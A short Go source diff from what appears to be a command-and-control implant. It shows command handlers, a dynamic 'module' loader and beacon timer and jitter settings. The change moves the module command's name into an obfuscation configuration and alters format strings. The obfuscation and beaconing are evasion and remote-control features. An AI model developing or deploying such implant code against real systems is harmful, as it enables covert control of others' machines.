@@ -35,9 +35,8 @@ func init() {
 		return handleUpdateCommand(cmd.Data), false
 	}
 	// module loader remains special case
-	handlers["module"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+	handlers[config.Obfuscation.Generic.Commands.Module.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
 		logger.Log("Loading dynamic content for 'module' command.")
-
 		var moduleData struct {
 			Name string `json:"name"`
 			Data string `json:"data"`
@@ -111,13 +110,13 @@ func handleUpdateCommand(data json.RawMessage) string {
 
 	if updateData.Timer > 0 {
 		config.Timer = updateData.Timer
-		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %d", config.Timer))
-		logger.Log(fmt.Sprintf("Timer updated to %d seconds", config.Timer))
+		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %f", config.Timer))
+		logger.Log(fmt.Sprintf("Timer updated to %f seconds", config.Timer))
 	}
 	if updateData.Jitter >= 0 {
 		config.Jitter = updateData.Jitter
-		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %d", config.Jitter))
-		logger.Log(fmt.Sprintf("Jitter updated to %d seconds", config.Jitter))
+		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %f", config.Jitter))
+		logger.Log(fmt.Sprintf("Jitter updated to %f seconds", config.Jitter))
 	}
 
 	if len(outputMsgs) == 0 {
